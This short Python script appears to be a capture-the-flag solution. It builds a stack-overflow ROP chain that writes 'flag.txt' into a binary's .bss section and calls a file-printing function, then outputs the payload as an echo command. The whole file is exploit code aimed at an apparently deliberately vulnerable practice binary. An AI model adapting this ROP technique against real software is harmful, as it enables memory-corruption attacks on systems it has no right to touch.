#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

BSS = PACKP(0x601038)
BSS8 = PACKP(0x601040)

MOV_R15_AT_R14 = PACKP(0x400628)
POP_R14_R15 = PACKP(0x400690)
POP_RDI = PACKP(0x400693)
FILE = PACKP(0x400510)

rop = b"a" * 0x28
rop += POP_R14_R15 + BSS + bytes("flag.txt", 'utf-8')
rop += MOV_R15_AT_R14
rop += POP_RDI + BSS
rop += FILE

echo(rop)
